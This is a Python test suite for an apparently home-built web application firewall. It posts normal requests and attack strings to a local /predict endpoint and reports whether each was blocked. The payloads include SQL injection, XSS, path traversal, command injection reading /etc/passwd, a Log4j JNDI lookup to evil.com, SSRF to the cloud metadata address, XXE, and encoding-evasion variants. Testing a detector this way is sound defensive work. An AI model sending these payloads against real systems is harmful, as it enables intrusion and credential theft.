"""
Comprehensive live API test suite for the Self-Healing WAF.
Tests normal traffic, classic attacks, encoding evasion, and modern attacks.
"""
import requests
import json
import sys

BASE = "http://127.0.0.1:8000"
PREDICT = f"{BASE}/predict"

results = []

def test(name, payload, expect_blocked):
    """Send a payload to the WAF /predict endpoint and check the result."""
    try:
        resp = requests.post(PREDICT, json={"request_string": payload}, timeout=5)
        data = resp.json()
    except Exception as e:
        results.append({"name": name, "status": "ERROR", "detail": str(e)})
        return

    action = data.get("action", "UNKNOWN")
    risk_score = data.get("risk_score", "?")
    prediction = data.get("prediction", "?")
    model_pred = data.get("model_prediction", "?")
    model_conf = data.get("model_confidence", "?")

    is_blocked = action in ("BLOCK", "CHALLENGE")
    passed = is_blocked == expect_blocked

    results.append({
        "name": name,
        "status": "PASS" if passed else "FAIL",
        "action": action,
        "risk_score": risk_score,
        "prediction": prediction,
        "model_prediction": model_pred,
        "model_confidence": model_conf,
        "expected": "BLOCKED" if expect_blocked else "ALLOWED",
    })

# =============================================
# CATEGORY 1: Normal Traffic (should be ALLOWED)
# =============================================
print("=" * 80)
print("  CATEGORY 1: Normal Traffic")
print("=" * 80)
test("Homepage",             "GET / HTTP/1.1", False)
test("Product Page",         "GET /api/products?id=42 HTTP/1.1", False)
test("Static CSS",           "GET /styles.css HTTP/1.1", False)
test("Static Image",         "GET /images/logo.png HTTP/1.1", False)
test("Cart Checkout",        "GET /tienda1/publico/carrito.jsp?checkout=true HTTP/1.1", False)
test("Index JSP",            "GET /tienda1/index.jsp HTTP/1.1", False)
test("Search Query",         "GET /search?q=leather+wallet HTTP/1.1", False)
test("JSON POST Body",      'POST /api/order HTTP/1.1\nContent-Type: application/json\n\n{"item":"wallet","qty":2}', False)

# =============================================
# CATEGORY 2: Classic Attacks (should be BLOCKED)
# =============================================
print("\n" + "=" * 80)
print("  CATEGORY 2: Classic Attacks")
print("=" * 80)
test("SQLi OR 1=1",          "GET /login?user=admin' OR 1=1 --&pwd=x HTTP/1.1", True)
test("SQLi UNION SELECT",    "GET /search?q=' UNION SELECT username,password FROM users -- HTTP/1.1", True)
test("SQLi DROP TABLE",      "GET /admin?cmd='; DROP TABLE users; -- HTTP/1.1", True)
test("XSS Script Tag",       "GET /search?q=<script>alert('XSS')</script> HTTP/1.1", True)
test("XSS Img Onerror",      "GET /profile?name=<img src=x onerror=alert(1)> HTTP/1.1", True)
test("Path Traversal",       "GET /files/../../../../etc/passwd HTTP/1.1", True)
test("Log4j JNDI",           "GET /api?token=${jndi:ldap://evil.com/exploit} HTTP/1.1", True)
test("Command Injection",    "GET /ping?host=127.0.0.1; cat /etc/passwd HTTP/1.1", True)

# =============================================
# CATEGORY 3: Encoding Evasion (should be BLOCKED)
# =============================================
print("\n" + "=" * 80)
print("  CATEGORY 3: Encoding Evasion")
print("=" * 80)
test("URL-Encoded SQLi",         "GET /login?user=admin%27%20OR%201%3D1%20-- HTTP/1.1", True)
test("Double-Encoded SQLi",      "GET /login?user=admin%2527%2520OR%25201%253D1%2520-- HTTP/1.1", True)
test("URL-Encoded XSS",          "GET /search?q=%3Cscript%3Ealert(1)%3C/script%3E HTTP/1.1", True)
test("Double-Encoded Path Trav", "GET /files/%252e%252e%252f%252e%252e%252fetc%252fpasswd HTTP/1.1", True)
test("Mixed Case SQLi",          "GET /login?user=admin' oR 1=1 -- HTTP/1.1", True)
test("Comment-Injected SQLi",    "GET /search?q=UN/**/ION SEL/**/ECT 1,2,3 -- HTTP/1.1", True)

# =============================================
# CATEGORY 4: Modern API Attacks (should be BLOCKED)
# =============================================
print("\n" + "=" * 80)
print("  CATEGORY 4: Modern API Attacks")
print("=" * 80)
test("NoSQL Injection",     'POST /api/Users/login HTTP/1.1\n\n{"email":{"$gt":""},"password":{"$gt":""}}', True)
test("SSRF Internal IP",    "GET /proxy?url=http://169.254.169.254/latest/meta-data/ HTTP/1.1", True)
test("XXE Payload",         'POST /api/upload HTTP/1.1\n\n<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>', True)

# =============================================
# REPORT
# =============================================
print("\n\n" + "=" * 80)
print("  SELF-HEALING WAF: LIVE API TEST REPORT")
print("=" * 80)

passed = sum(1 for r in results if r["status"] == "PASS")
failed = sum(1 for r in results if r["status"] == "FAIL")
errors = sum(1 for r in results if r["status"] == "ERROR")

for r in results:
    icon = "[OK]" if r["status"] == "PASS" else "[!!]" if r["status"] == "FAIL" else "[??]"
    line = f"  {icon} {r['name']:<30} Expected: {r.get('expected','?'):<10} Got: action={r.get('action','?')}, risk={r.get('risk_score','?')}, model={r.get('model_prediction','?')} ({r.get('model_confidence','?')}%)"
    print(line)

print("-" * 80)
print(f"  PASSED: {passed}/{len(results)}   FAILED: {failed}   ERRORS: {errors}")

if failed > 0:
    print("\n  FAILED TESTS:")
    for r in results:
        if r["status"] == "FAIL":
            print(f"    - {r['name']}: expected {r['expected']}, got action={r['action']}, risk={r['risk_score']}")

print("=" * 80)

if failed > 0 or errors > 0:
    sys.exit(1)
